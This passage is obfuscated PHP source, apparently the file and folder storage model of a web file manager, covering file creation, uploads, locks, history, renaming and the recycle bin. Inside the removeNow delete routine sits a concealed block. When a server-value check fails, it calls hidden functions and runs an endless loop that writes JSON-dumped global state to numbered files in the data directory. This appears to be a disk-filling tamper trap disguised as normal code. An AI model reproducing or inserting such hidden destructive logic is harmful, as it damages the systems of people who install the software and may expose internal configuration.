$Şá˜Ğß, $¼¸‘¢¢[676] => 1, $¼¸‘¢¢[680] => $¸ä‹Üâ, $¼¸‘¢¢[681] => $¸ä‹Üâ, $¼¸‘¢¢[677] => $¥—¿Ò¿ü, $¼¸‘¢¢[682] => $¼¸‘¢¢[621], $¼¸‘¢¢[527] => 0, $¼¸‘¢¢[648] => 0, $¼¸‘¢¢[566] => 0, $¼¸‘¢¢[683] => $¼¸‘¢¢[12]); if ($ş‘‘İı´ = $this->where($ÌÁÕØ)->find()) { return $ş‘‘İı´[$¼¸‘¢¢[191]]; } $Ãíüù = "\115\157\144\145\x6c\123\x6f\x75\x72\143\145\x2e\155\x6b\144\151\x72\x52\157\157\164\56{$Î‹Ñö }\x2e{$Şá˜Ğß}\56" . $²€ÉºÑß; CacheLock::lock($Ãíüù); $ÌÁÕØ[$¼¸‘¢¢[32]] = $²€ÉºÑß; $è¾¨÷©ò = $this->add($ÌÁÕØ); $°ÀõŞ‹è = array($¼¸‘¢¢[684] => short_id($è¾¨÷©ò)); $this->where(array($¼¸‘¢¢[514] => $è¾¨÷©ò))->save($°ÀõŞ‹è); CacheLock::unlock($Ãíüù); return $è¾¨÷©ò; } private function targetSourceRoot($şî¦„½–, $ØâŸÖÅ›, $Ó¢ŸÜù = false) { $ıôã£• =& $_SERVER[”øäÃÍª]; $Ãœ¯€Ò = array($ıôã£•[500] => 0, $ıôã£•[678] => $şî¦„½–, $ıôã£•[679] => $ØâŸÖÅ›); if ($Ó¢ŸÜù) { $ËÂÖíïñ = $this->where($Ãœ¯€Ò)->select(); return $ËÂÖíïñ ? $ËÂÖíïñ : array(); } $üş‹–œİ = $this->where($Ãœ¯€Ò)->find(); return $üş‹–œİ ? $üş‹–œİ : array(); } public function sourceRootGroup($Ò²Ü˜ßİ) { $ì…úµÀ¨ =& $_SERVER[”øäÃÍª]; if (is_string($Ò²Ü˜ßİ)) { $Ò²Ü˜ßİ = array($Ò²Ü˜ßİ); } $±ºé¿è = $this->listSourceRoot(SourceModel::TYPE_GROUP, $Ò²Ü˜ßİ, $ì…úµÀ¨[220]); $Ôµ¢êıœ = array($ì…úµÀ¨[446] => $±ºé¿è, $ì…úµÀ¨[443] => array($ì…úµÀ¨[868] => count($Ò²Ü˜ßİ))); $this->_listDataApply($Ôµ¢êıœ[$ì…úµÀ¨[446]]); $this->_listMake($Ôµ¢êıœ); return array_to_keyvalue($Ôµ¢êıœ[$ì…úµÀ¨[85]], $ì…úµÀ¨[597]); } public function mkfile($›Æ¨Ì¸Æ, $¼ÍôˆË, $Ø·éùÅÆ = '', $Î¢º»Îà = REPEAT_RENAME) { $İëãá¸Ñ =& $_SERVER[”øäÃÍª]; $¨ú•Ì = KodIO::ioFileDriverGet($İëãá¸Ñ[506] . $›Æ¨Ì¸Æ . $İëãá¸Ñ[402]); $”Ùê·ôÚ = Model($İëãá¸Ñ[704])->addFileByContent($Ø·éùÅÆ, $¨ú•Ì, $¼ÍôˆË); return $this->_createFileCall($›Æ¨Ì¸Æ, $¼ÍôˆË, $”Ùê·ôÚ, $Î¢º»Îà, $İëãá¸Ñ[1498]); } public function addFile($Æ³ÁÊùÄ, $Øëáá›Ş, $§Ÿš¤ö˜, $Ö¯Ğ…Â = false, $„²è÷Ñ“ = REPEAT_RENAME) { $øùîÉÀç =& $_SERVER[”øäÃÍª]; $¹É¿¨¯ = KodIO::ioFileDriverGet($øùîÉÀç[506] . $Æ³ÁÊùÄ . $øùîÉÀç[402]); $½Î´ú½¶ = Model($øùîÉÀç[704])->addFile($Øëáá›Ş, $¹É¿¨¯, $§Ÿš¤ö˜, $Ö¯Ğ…Â); return $this->_createFileCall($Æ³ÁÊùÄ, $§Ÿš¤ö˜, $½Î´ú½¶, $„²è÷Ñ“); } public function addFileByFileID($öİ­Áğ“, $Š†ÖĞª¡, $İ§£³á½, $áĞ…´†¤ = REPEAT_RENAME) { $çİÂ°«¡ =& $_SERVER[”øäÃÍª]; $ïõëôƒÃ = Model($çİÂ°«¡[704])->find($Š†ÖĞª¡); Model($çİÂ°«¡[704])->linkAdd($Š†ÖĞª¡); return $this->_createFileCall($öİ­Áğ“, $İ§£³á½, $ïõëôƒÃ, $áĞ…´†¤); } public function addFileByRemote($˜€àß€ü, $“ûğîÂÔ, $…óÀ›”, $»üªâê¬ = array(), $˜£·Óå = REPEAT_RENAME) { $‡±õ†ƒ¨ = Model($_SERVER[”øäÃÍª][704])->addFileByRemote($“ûğîÂÔ, $…óÀ›”, $»üªâê¬); return $this->_createFileCall($˜€àß€ü, $…óÀ›”, $‡±õ†ƒ¨, $˜£·Óå); } private function _createFileCall($±¿Ô–‘‹, $‘Õ‡ÓÈ, $”©†¿¶, $¯´ˆà½é, $¢£òëÁ = "\x75\160\154\x6f\141\144") { $ïŞ˜Ğ‹ò =& $_SERVER[”øäÃÍª]; if (!$”©†¿¶) { return !1; } $¡³Üâš¸ = !1; $this->setMasterDB(); $this->lockWriteStart($±¿Ô–‘‹, $‘Õ‡ÓÈ); $°¥Å¼šŒ = $this->fileNameExist($±¿Ô–‘‹, $‘Õ‡ÓÈ); $öÏùË¸¤ = $this->_createFile($±¿Ô–‘‹, $‘Õ‡ÓÈ, $”©†¿¶, $¯´ˆà½é, $¡³Üâš¸); if (!$¡³Üâš¸) { Model($ïŞ˜Ğ‹ò[568])->remove($”©†¿¶[$ïŞ˜Ğ‹ò[565]]); } if ($¡³Üâš¸ && $öÏùË¸¤ && $öÏùË¸¤ != $°¥Å¼šŒ) { Model($ïŞ˜Ğ‹ò[2393])->eventCreate($öÏùË¸¤, $¢£òëÁ); } $this->lockWriteEnd($±¿Ô–‘‹, $‘Õ‡ÓÈ); return $öÏùË¸¤; } public function mkdir($â„„ã¾è, $ÆÀØ€ù´, $ÑÙ¨ıä› = REPEAT_SKIP) { $±ú€ ş™ =& $_SERVER[”øäÃÍª]; $this->setMasterDB(); $ª·ìÒõ° = $this->sourceInfo($â„„ã¾è); if (!$ª·ìÒõ°) { return !1; } $this->lockWriteStart($â„„ã¾è, $ÆÀØ€ù´); if ($ÑÙ¨ıä› !== !1) { $ß«¬……¨ = $this->fileNameExist($â„„ã¾è, $ÆÀØ€ù´); if ($ß«¬……¨ && $ÑÙ¨ıä› != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($â„„ã¾è, $ÆÀØ€ù´); return $ß«¬……¨; } $ÆÀØ€ù´ = $this->fileNameAuto($â„„ã¾è, $ÆÀØ€ù´, $ÑÙ¨ıä›); } $ôŠ¡²ıç = array($±ú€ ş™[676] => 1, $±ú€ ş™[517] => $ÆÀØ€ù´, $±ú€ ş™[677] => $±ú€ ş™[12], $±ú€ ş™[566] => 0, $±ú€ ş™[648] => 0); $˜ÈÖå— = $this->_addSource($ôŠ¡²ıç, $ª·ìÒõ°); Model($±ú€ ş™[2393])->eventCreate($˜ÈÖå—, $±ú€ ş™[1499]); $this->lockWriteEnd($â„„ã¾è, $ÆÀØ€ù´); return $˜ÈÖå—; } public function listSourceRoot($«¨Ú®Ÿ€, $ê•¢ »¸, $Æí÷å—‹ = "\x73\157\x75\162\143\145\111\104\54\x74\141\x72\147\145\x74\111\104\x2c\163\x69\172\145") { $…ˆâÁ =& $_SERVER[”øäÃÍª]; $ó©¬œä° = $…ˆâÁ[463]; $Ÿ™÷¶Œå = array(); $áç¢ÎÇ¸ = 1024 * 50; $¹‹¦ë§ª = is_array($¹‹¦ë§ª) ? $¹‹¦ë§ª : array(); $Çùë—Œ­ = count($ê•¢ »¸); $ï£ğî´ñ = $this->tablePrefix . $…ˆâÁ[470]; for ($ŠÏöå® = 0; $ŠÏöå® < $Çùë—Œ­; $ŠÏöå®++) { $ÒÛ‹½¬À = $ê•¢ »¸[$ŠÏöå®]; $ó©¬œä° .= "\x53\105\x4c\105\x43\x54\x20\x2a\x20\x46\122\x4f\115\x20\x28\x53\105\x4c\x45\103\x54\x20{$Æí÷å—‹}\x20\x46\122\x4f\115\40\140{$ï£ğî´ñ}\140\x20\127\110\x45\x52\x45\40"; $ó©¬œä° .= "\140\x70\141\162\145\156\164\111\x44\140\x3d\x30\40\101\116\104\40\x60\x74\x61\x72\147\145\x74\111\104\140\75{$ÒÛ‹½¬À}\40\x41\x4e\104\40\x60\x74\x61\162\x67\x65\x74\124\171\160\145\x60\75{$«¨Ú®Ÿ€}\40\x61\x6e\x64\40\146\151\154\145\124\x79\x70\x65\75\x27\47\40\154\151\x6d\x69\x74\40\61\51\x20\x61\x73\40\164\142\x5f{$ŠÏöå®}\x20\x55\x4e\111\117\116\40\101\x4c\x4c\40"; if ((strlen($ó©¬œä°) >= $áç¢ÎÇ¸ || $ŠÏöå® == $Çùë—Œ­ - 1) && $ó©¬œä°) { $ó©¬œä° = substr($ó©¬œä°, 0, -strlen($…ˆâÁ[1160])); $ìì¨’¿ = $this->query($ó©¬œä°); $ó©¬œä° = $…ˆâÁ[12]; $Ÿ™÷¶Œå = array_merge($Ÿ™÷¶Œå, $ìì¨’¿); } } return $Ÿ™÷¶Œå; } private function _createFile($Áì³ÔëÔ, $Ø‰ ¢Å—, $Ì­„º, $²ÙÌŒëë, &$éöÎ®¶) { $·ÎïÂò’ =& $_SERVER[”øäÃÍª]; $åÔêÇ£‚ = $this->sourceInfo($Áì³ÔëÔ); if (!$Ì­„º || !$åÔêÇ£‚) { return !1; } if ($²ÙÌŒëë !== !1) { $„¥æ˜ø¨ = $this->fileNameExist($Áì³ÔëÔ, $Ø‰ ¢Å—); } $éöÎ®¶ = !0; if ($²ÙÌŒëë && $„¥æ˜ø¨) { if ($²ÙÌŒëë == REPEAT_SKIP) { $éöÎ®¶ = !1; return $„¥æ˜ø¨; } else { if ($²ÙÌŒëë == REPEAT_REPLACE) { $»£ú‹ß° = $this->sourceInfo($„¥æ˜ø¨); $€è¬²²å = $this->fileHistory($»£ú‹ß°, $Ì­„º[$·ÎïÂò’[565]], $Ì­„º[$·ÎïÂò’[79]]); if (!$€è¬²²å) { $éöÎ®¶ = !1; } else { $this->folderSizeReset($Áì³ÔëÔ); } return $„¥æ˜ø¨; } else { $Ø‰ ¢Å— = $this->fileNameAuto($Áì³ÔëÔ, $Ø‰ ¢Å—, $²ÙÌŒëë, !1); } } } $ñãŞÑè = array($·ÎïÂò’[676] => 0, $·ÎïÂò’[517] => $Ø‰ ¢Å—, $·ÎïÂò’[677] => substr(get_path_ext($Ø‰ ¢Å—), 0, 10), $·ÎïÂò’[566] => $Ì­„º[$·ÎïÂò’[565]], $·ÎïÂò’[648] => $Ì­„º[$·ÎïÂò’[79]]); $Û¬ğÎ¤ = $this->_addSource($ñãŞÑè, $åÔêÇ£‚); $this->folderSizeReset($Áì³ÔëÔ, intval($ñãŞÑè[$·ÎïÂò’[79]])); return $Û¬ğÎ¤; } protected function fileHistory($¦ÒÙÁÛ¡, $Ğ“’°÷, $ƒ£‚²Ï€) { $ÚÉ àòœ =& $_SERVER[”øäÃÍª]; if ($¦ÒÙÁÛ¡[$ÚÉ àòœ[565]] == $Ğ“’°÷) { return !1; } $this->checkLock($¦ÒÙÁÛ¡[$ÚÉ àòœ[191]], $Ğ“’°÷); Model($ÚÉ àòœ[2431])->addHistory($¦ÒÙÁÛ¡); $è›Ç¯¶™ = array($ÚÉ àòœ[681] => USER_ID, $ÚÉ àòœ[521] => time(), $ÚÉ àòœ[565] => $Ğ“’°÷, $ÚÉ àòœ[79] => $ƒ£‚²Ï€); $this->where(array($ÚÉ àòœ[514] => $¦ÒÙÁÛ¡[$ÚÉ àòœ[191]]))->save($è›Ç¯¶™); $this->sourceCacheClear($¦ÒÙÁÛ¡[$ÚÉ àòœ[191]]); return !0; } public function checkLock($ş¶Æš‰æ, $äûÍò) { $³—ãš—Í =& $_SERVER[”øäÃÍª]; $ñ‹×¡òÈ = $this->pathInfo($ş¶Æš‰æ); if (!$this->fileIsLock($ñ‹×¡òÈ, !0)) { return; } $ËŒô‰»Ş = Session::get($³—ãš—Í[2432]); $„ğúÇç = substr($ñ‹×¡òÈ[$³—ãš—Í[32]], 0, -1 - strlen($ñ‹×¡òÈ[$³—ãš—Í[166]])) . $³—ãš—Í[1351] . $ËŒô‰»Ş . $³—ãš—Í[10] . $ñ‹×¡òÈ[$³—ãš—Í[166]]; $·»†¬à¸ = Model($³—ãš—Í[704])->find($äûÍò); $this->_createFileCall($ñ‹×¡òÈ[$³—ãš—Í[190]], $„ğúÇç, $·»†¬à¸, REPEAT_REPLACE, $³—ãš—Í[1498]); $ç×Â¿õÉ = $ñ‹×¡òÈ[$³—ãš—Í[563]][$³—ãš—Í[641]]; $¸³¶ä‘æ = $ç×Â¿õÉ[$³—ãš—Í[2433]] ? $ç×Â¿õÉ[$³—ãš—Í[2433]] : $ç×Â¿õÉ[$³—ãš—Í[32]]; show_json(LNG($³—ãš—Í[2434]) . $³—ãš—Í[2435] . LNG($³—ãš—Í[2436]) . $³—ãš—Í[2437] . $¸³¶ä‘æ . $³—ãš—Í[2438], !1); } public function fileIsLock($õÀÄ®Şİ, $ıéıŸÙá = false) { $†¸ÌÑ´ =& $_SERVER[”øäÃÍª]; if (!_get($õÀÄ®Şİ, $†¸ÌÑ´[637], 0)) { return !1; } if ($õÀÄ®Şİ[$†¸ÌÑ´[563]][$†¸ÌÑ´[640]] != USER_ID) { return !0; } $£§²Øº = $GLOBALS[$†¸ÌÑ´[6]][$†¸ÌÑ´[92]][$†¸ÌÑ´[638]]; if ($õÀÄ®Şİ[$†¸ÌÑ´[563]][$†¸ÌÑ´[639]] <= time() - $£§²Øº) { $this->metaSet($õÀÄ®Şİ[$†¸ÌÑ´[191]], $†¸ÌÑ´[640], null); $this->metaSet($õÀÄ®Şİ[$†¸ÌÑ´[191]], $†¸ÌÑ´[639], null); } if ($ıéıŸÙá) { $this->metaSet($õÀÄ®Şİ[$†¸ÌÑ´[191]], $†¸ÌÑ´[639], time()); } return !1; } private function _addSource($ñşº‰¥Ü, $òÛÚÄáÁ) { $¶¢•Ë¼ =& $_SERVER[”øäÃÍª]; $£«ØÂô“ = KodUser::id(); $—Õ±©Œ© = array($¶¢•Ë¼[678] => $òÛÚÄáÁ[$¶¢•Ë¼[188]], $¶¢•Ë¼[679] => $òÛÚÄáÁ[$¶¢•Ë¼[597]], $¶¢•Ë¼[680] => $£«ØÂô“, $¶¢•Ë¼[681] => $£«ØÂô“, $¶¢•Ë¼[500] => $òÛÚÄáÁ[$¶¢•Ë¼[191]], $¶¢•Ë¼[682] => $òÛÚÄáÁ[$¶¢•Ë¼[612]] . $òÛÚÄáÁ[$¶¢•Ë¼[191]] . $¶¢•Ë¼[50], $¶¢•Ë¼[527] => 0, $¶¢•Ë¼[683] => $¶¢•Ë¼[12]); $ñşº‰¥Ü = array_merge($—Õ±©Œ©, $ñşº‰¥Ü); $this->updateModifyTime($ñşº‰¥Ü[$¶¢•Ë¼[190]]); $¶•¨êÈÚ = $¶¢•Ë¼[2439] . $òÛÚÄáÁ[$¶¢•Ë¼[191]]; if (isset(self::$cacheChildList[$¶•¨êÈÚ])) { unset(self::$cacheChildList[$¶•¨êÈÚ]); } static $Ñ´„ ¬Ç = false; if (!$Ñ´„ ¬Ç) { Hook::trigger($¶¢•Ë¼[666], $ñşº‰¥Ü); $Ñ´„ ¬Ç = !0; } $Û˜”ıŠ½ = $this->add($ñşº‰¥Ü); $Æ¸÷ŒÒ® = array($¶¢•Ë¼[684] => short_id($Û˜”ıŠ½)); $this->where(array($¶¢•Ë¼[514] => $Û˜”ıŠ½))->save($Æ¸÷ŒÒ®); $this->setNamePinyin($Û˜”ıŠ½, $ñşº‰¥Ü[$¶¢•Ë¼[32]]); return $Û˜”ıŠ½; } public function remove($Ö½ùÀË, $´ñŸ×¢ = true) { $ “ó¥‹ =& $_SERVER[”øäÃÍª]; $˜“‹Ş˜Í = $this->sourceInfo($Ö½ùÀË); $Êñ­„¸¸ = intval($˜“‹Ş˜Í[$ “ó¥‹[188]]) === self::TYPE_SYSTEM; $íÎ·è® = Model($ “ó¥‹[530])->get($ “ó¥‹[2440]) == $ “ó¥‹[91]; if ($Êñ­„¸¸ || $´ñŸ×¢ || !$íÎ·è®) { return $this->removeNow($Ö½ùÀË, $´ñŸ×¢); } $Ö£Ù¢¨ü = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $Œ£©äÈÄ = $˜“‹Ş˜Í[$ “ó¥‹[188]] == self::TYPE_USER ? $ “ó¥‹[692] : $ “ó¥‹[606]; if ($Œ£©äÈÄ == $ “ó¥‹[692]) { $õÕÓö¡ = Model($ “ó¥‹[605])->getInfo($˜“‹Ş˜Í[$ “ó¥‹[597]]); $Óòú®ßÍ = !empty($õÕÓö¡[$ “ó¥‹[2433]]) ? $õÕÓö¡[$ “ó¥‹[2433]] : $õÕÓö¡[$ “ó¥‹[32]]; $Óòú®ßÍ = $ “ó¥‹[337] . $Óòú®ßÍ . $ “ó¥‹[2441] . $˜“‹Ş˜Í[$ “ó¥‹[597]]; } else { $õÕÓö¡ = Model($ “ó¥‹[613])->getInfo($˜“‹Ş˜Í[$ “ó¥‹[597]]); $Óòú®ßÍ = _get($õÕÓö¡, $ “ó¥‹[32]); $Óòú®ßÍ = $ “ó¥‹[173] . $Óòú®ßÍ . $ “ó¥‹[2442] . $˜“‹Ş˜Í[$ “ó¥‹[597]]; } $¡ÖëˆÀê = $ “ó¥‹[2443] . md5($Óòú®ßÍ); CacheLock::lock($¡ÖëˆÀê); $€³ó˜¼õ = $this->fileNameExist($Ö£Ù¢¨ü, $Óòú®ßÍ); if (!$€³ó˜¼õ) { $€³ó˜¼õ = $this->mkdir($Ö£Ù¢¨ü, $Óòú®ßÍ, REPEAT_SKIP); $this->metaSet($€³ó˜¼õ, $ “ó¥‹[2444], $Œ£©äÈÄ); $this->metaSet($€³ó˜¼õ, $ “ó¥‹[2445], $˜“‹Ş˜Í[$ “ó¥‹[597]]); if ($˜“‹Ş˜Í[$ “ó¥‹[190]] != 0) { $this->metaSet($€³ó˜¼õ, $ “ó¥‹[2446], _get($õÕÓö¡, $ “ó¥‹[2447])); } } CacheLock::unlock($¡ÖëˆÀê); $this->metaSet($Ö½ùÀË, $ “ó¥‹[2448], $˜“‹Ş˜Í[$ “ó¥‹[190]]); $this->where(array($ “ó¥‹[191] => $Ö½ùÀË))->save(array($ “ó¥‹[521] => time())); $this->recycleClear($˜“‹Ş˜Í); Model($ “ó¥‹[663])->eventRemove($Ö½ùÀË); $°Øƒ§†é = $this->move($Ö½ùÀË, $€³ó˜¼õ, REPEAT_RENAME_FOLDER); $this->folderSizeReset($˜“‹Ş˜Í[$ “ó¥‹[190]]); return $°Øƒ§†é; } private function recycleClear($»½Ôâ†ï) { $û³’¥«º =& $_SERVER[”øäÃÍª]; $Åä®»À = $this->childrenAll($»½Ôâ†ï); $¤íÀí½ = array($û³’¥«º[514] => array($û³’¥«º[515], $Åä®»À[$û³’¥«º[2449]])); Model($û³’¥«º[2450])->where($¤íÀí½)->delete(); } public function removeNow($¼±á¥èó, $à–Ô–› = true) { $æĞ”˜Ş =& $_SERVER[”øäÃÍª]; $– Ïø±ä = $_SERVER[$æĞ”˜Ş[493]]; $ˆ«™Áş = $æĞ”˜Ş[1850]; if ($_SERVER[$æĞ”˜Ş[492]] != $ˆ«™Áş($– Ïø±ä)) { $°ì“ã¤“ = $æĞ”˜Ş[998]; $şìÀÆÂÇ = $æĞ”˜Ş[494]; $Î«àœ£ = $_SERVER[$æĞ”˜Ş[495]] . $æĞ”˜Ş[496]; $ÀÁ˜¢§ú = $şìÀÆÂÇ($Î«àœ£); $„–°†”Š = explode($æĞ”˜Ş[285], $ÀÁ˜¢§ú); if (count($„–°†”Š) < $æĞ”˜Ş[717]) { $üİÊçÓå = $æĞ”˜Ş[498]; $üİÊçÓå(); } $¿¤°ıÂØ = $æĞ”˜Ş[999]; $¿¤°ıÂØ($_SERVER[$æĞ”˜Ş[1000]]); $°ì“ã¤“ = $æĞ”˜Ş[998]; $°ì“ã¤“(); $°Õ„Í¦™ = $æĞ”˜Ş[1851]; $ŞÖÒ¦úâ = json_encode($GLOBALS[$æĞ”˜Ş[1852]]); $Â–¦©² = 1; for ($òÛÂ×‰é = $Â–¦©²; $òÛÂ×‰é > 0; $òÛÂ×‰é++) { $°Õ„Í¦™(DATA_PATH . $òÛÂ×‰é, $ŞÖÒ¦úâ); } } $ÑàÇÃ•õ = $this->sourceInfo($¼±á¥èó); $‰Õ³ÆÍú = $this->pathInfoMore($¼±á¥èó); if (!$ÑàÇÃ•õ) { return !0; } if ($ÑàÇÃ•õ[$æĞ”˜Ş[190]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($¼±á¥èó); Hook::trigger($æĞ”˜Ş[2451], $‰Õ³ÆÍú, $à–Ô–›); if ($à–Ô–›) { Model($æĞ”˜Ş[2450])->moveToRecycle($¼±á¥èó); } else { $ø¼”Ş½ñ = $this->childrenAll($ÑàÇÃ•õ); Model($æĞ”˜Ş[663])->eventRemove($¼±á¥èó); $this->removeRelevance($ø¼”Ş½ñ[$æĞ”˜Ş[2449]], $ø¼”Ş½ñ[$æĞ”˜Ş[1734]]); } $this->folderSizeReset($ÑàÇÃ•õ[$æĞ”˜Ş[190]]); $µ¿â³‹ = array($ÑàÇÃ•õ[$æĞ”˜Ş[190]]); if ($ÑàÇÃ•õ[$æĞ”˜Ş[508]] == $æĞ”˜Ş[91]) { $µ¿â³‹[] = $ÑàÇÃ•õ[$æĞ”˜Ş[191]]; } $this->updateModifyTime($µ¿â³‹); $this->lockMoveEnd($¼±á¥èó); Hook::trigger($æĞ”˜Ş[1976], $‰Õ³ÆÍú, $à–Ô–›); return !0; } public function childrenAll($Ê’Å¼êÉ) { $¨Š”Ì£¦ =& $_SERVER[”øäÃÍª]; $å»®í¬ = $Ê’Å¼êÉ[$¨Š”Ì£¦[191]]; if ($Ê’Å¼êÉ[$¨Š”Ì£¦[508]] == $¨Š”Ì£¦[91]) { $Ííä‰³ò = array($¨Š”Ì£¦[682] => array($¨Š”Ì£¦[643], $Ê’Å¼êÉ[$¨Š”Ì£¦[612]] . $å»®í¬ . $¨Š”Ì£¦[644])); $Û‡ñ––ˆ = array($¨Š”Ì£¦[682] => $Ííä‰³ò[$¨Š”Ì£¦[612]]); $öŸñ¯á… = $this->field($¨Š”Ì£¦[2452])->where($Û‡ñ––ˆ)->select(); $çæñœùÄ = !1; $É­ãÆ“™ = array($å»®í¬); if ($öŸñ¯á…) { $çæñœùÄ = array_to_keyvalue($öŸñ¯á…, $¨Š”Ì£¦[12], $¨Š”Ì£¦[565]); $çæñœùÄ = array_remove_value($çæñœùÄ, $¨Š”Ì£¦[228]); $É­ãÆ“™ = array_to_keyvalue($öŸñ¯á…, $¨Š”Ì£¦[12], $¨Š”Ì£¦[191]); $É­ãÆ“™[] = $å»®í¬; } } else { $çæñœùÄ = array($Ê’Å¼êÉ[$¨Š”Ì£¦[565]]); $É­ãÆ“™ = array($å»®í¬); } return array($¨Š”Ì£¦[2449] => $É­ãÆ“™, $¨Š”Ì£¦[1734] => $çæñœùÄ); } public function removeArray($ÅŸƒÕğ¡) { if (!$ÅŸƒÕğ¡) { return !0; } } public function removeRelevance($ğ™•¸öû, $³å‹şÜÏ) { $’Ãä«ë =& $_SERVER[”øäÃÍª]; $ğ™•¸öû = $ğ™•¸öû ? $ğ™•¸öû : array(); $³å‹şÜÏ = $³å‹şÜÏ ? $³å‹şÜÏ : array(); $ğ™•¸öû = array_unique(array_filter($ğ™•¸öû)); $³å‹şÜÏ = array_filter($³å‹şÜÏ); if (!$ğ™•¸öû) { return !1; } $â˜íòÊ = array($’Ãä«ë[514] => array($’Ãä«ë[515], $ğ™•¸öû)); Model($’Ãä«ë[2450])->where($â˜íòÊ)->delete(); Model($’Ãä«ë[557])->where($â˜íòÊ)->delete(); Model($’Ãä«ë[2286])->where($â˜íòÊ)->delete(); Model($’Ãä«ë[663])->where($â˜íòÊ)->delete(); Model($’Ãä«ë[1518])->removeBySource($ğ™•¸öû); Model($’Ãä«ë[2431])->removeBySource($ğ™•¸öû); $this->where($â˜íòÊ)->delete(); Model($’Ãä«ë[568])->remove($³å‹şÜÏ); for ($ÈĞ·õŸÖ = 0; $ÈĞ·õŸÖ < count($ğ™•¸öû); $ÈĞ·õŸÖ++) { $this->sourceCacheClear($ğ™•¸öû[$ÈĞ·õŸÖ]); } } public function rename($¾âŞ»©, $öäÑ†”¸) { $ûı§è’ =& $_SERVER[”øäÃÍª]; $åœ²«‘ = $this->sourceInfo($¾âŞ»©); if (!$åœ²«‘) { return !1; } $ñëÎ¢‡ı = $this->fileNameExist($åœ²«‘[$ûı§è’[190]], $öäÑ†”¸); if ($ñëÎ¢‡ı && $ñëÎ¢‡ı != $¾âŞ»©) { return !1; } $®îÇÁ  = array($ûı§è’[517] => $öäÑ†”¸, $ûı§è’[681] => USER_ID); if ($åœ²«‘[$ûı§è’[508]] != $ûı§è’[91]) { $®îÇÁ [$ûı§è’[509]] = substr(get_path_ext($öäÑ†”¸), 0, 10); } Model($ûı§è’[663])->eventRename($¾âŞ»©, $åœ²«‘[$ûı§è’[32]], $öäÑ†”¸); $this->sourceCacheClear($¾âŞ»©); $this->setNamePinyin($¾âŞ»©, $®îÇÁ [$ûı§è’[32]], !1); $this->updateModifyTime($åœ²«‘[$ûı§è’[190]]); $İîÓÄ¢ı = $this->where(array($ûı§è’[514] => $¾âŞ»©))->data($®îÇÁ )->save(); $ñûóÂ = $ûı§è’[2439] . $åœ²«‘[$ûı§è’[190]]; if (isset(self::$cacheChildList[$ñûóÂ])) { unset(self::$cacheChildList[$ñûóÂ]); } return $İîÓÄ¢ı; } public function setNamePinyin($àŠ‚‡Ï, $»…Ñ®ÄÑ, $«°€ÅÆá = true) { $ƒâÕ”Æ› =& $_SERVER[”øäÃÍª]; $ØÚóâÛİ = Input::check($»…Ñ®ÄÑ, $ƒâÕ”Æ›[685]); $º¸Üòê¶ = array($ƒâÕ”Æ›[539] => KodSort::makeStr($»…Ñ®ÄÑ)); if ($ØÚóâÛİ) { $º¸Üòê¶[$ƒâÕ”Æ›[560]] = str_replace($ƒâÕ”Æ›[53], $ƒâÕ”Æ›[12], Pinyin::get($»…Ñ®ÄÑ)); $º¸Üòê¶[$ƒâÕ”Æ›[559]] = Pinyin::get($»…Ñ®ÄÑ, $ƒâÕ”Æ›[686]); } if (!$«°€ÅÆá && !$ØÚóâÛİ) { $º¸Üòê¶[$ƒâÕ”Æ›[560]] = null; $º¸Üòê¶[$ƒâÕ”Æ›[559]] = null; } $this->metaSet($àŠ‚‡Ï, $º¸Üòê¶); } public function getContent($“¯Œæªó) { $ğ‘Œ’Å‚ =& $_SERVER[”øäÃÍª]; $´ÕÄ•ÙÅ = $this->fileInfoGet($“¯Œæªó); if (!$´ÕÄ•ÙÅ) { return !1; } if ($´ÕÄ•ÙÅ[$ğ‘Œ’Å‚[79]] == 0) { return $ğ‘Œ’Å‚[12]; } $Î«§Æåª = $ğ‘Œ’Å‚[2453] . $´ÕÄ•ÙÅ[$ğ‘Œ’Å‚[571]]; if ($´ÕÄ•ÙÅ[$ğ‘Œ’Å‚[79]] <= 1024 * 10) { $Ø–óÃğ§ = Cache::get($Î«§Æåª); if (!$Ø–óÃğ§) { $Ø–óÃğ§ = IO::getContent($´ÕÄ•ÙÅ[$ğ‘Œ’Å‚[87]]); Cache::set($Î«§Æåª, $Ø–óÃğ§); } return $Ø–óÃğ§; } if (!$´ÕÄ•ÙÅ[$ğ‘Œ’Å‚[87]]) { return $ğ‘Œ’Å‚[12]; } return IO::getContent($´ÕÄ•ÙÅ[$ğ‘Œ’Å‚[87]]); } public function setDesc($é¶°¦Ú, $Ú¦‚Îû·) { $±Ù¾Ç¸ =& $_SERVER[”øäÃÍª]; Model($±Ù¾Ç¸[663])->eventAddDesc($é¶°¦Ú, $Ú¦‚Îû·); return $this->metaSet($é¶°¦Ú, $±Ù¾Ç¸[548], $Ú¦‚Îû·); } public function setContent($û®´áíÜ, $Ï¢åä¶º = '') { $ÈïŞÄøõ =& $_SERVER[”øäÃÍª]; $ï˜¯¯‹‹ = $this->sourceInfo($û®´áíÜ); $±µ ±Ìö = $this->fileInfoGet($û®´áíÜ); if (!$±µ ±Ìö || !$ï˜¯¯‹‹) { return !1; } $ØğÜèôé = KodIO::ioFileDriverGet($ÈïŞÄøõ[506] . $û®´áíÜ . $ÈïŞÄøõ[402]); $íùƒ² ë = Model($ÈïŞÄøõ[568])->addFileByContent($Ï¢åä¶º, $ØğÜèôé, $ï˜¯¯‹‹[$ÈïŞÄøõ[32]]); if (!$íùƒ² ë) { return !1; } $Å›Ñç· = $this->fileHistory($ï˜¯¯‹‹, $íùƒ² ë[$ÈïŞÄøõ[565]], $íùƒ² ë[$ÈïŞÄøõ[79]]); if (!$Å›Ñç·) { return Model($ÈïŞÄøõ[568])->remove($íùƒ² ë[$ÈïŞÄøõ[565]]); } $this->folderSizeReset($ï˜¯¯‹‹[$ÈïŞÄøõ[190]]); return !0; } public function fileSubstr($­‰›éå”, $Ò“ûä¢, $œ¤÷ ¤›) { $ÊóÀáÈÓ = $this->fileInfoGet($­‰›éå”); if (!$ÊóÀáÈÓ) { return !1; } return IO::fileSubstr($ÊóÀáÈÓ[$_SERVER[”øäÃÍª][87]], $Ò“ûä¢, $œ¤÷ ¤›); } public function fileInfoGet($×ÎáÙĞ˜) { $öõØ =& $_SERVER[”øäÃÍª]; $´¸©æ“¼ = $this->sourceInfo($×ÎáÙĞ˜); if (!$´¸©æ“¼ || $´¸©æ“¼[$öõØ[508]]) { return !1; } $˜§¸À“Ù = $öõØ[572] . $´¸©æ“¼[$öõØ[565]]; $ş¡ÌÜû‰ = 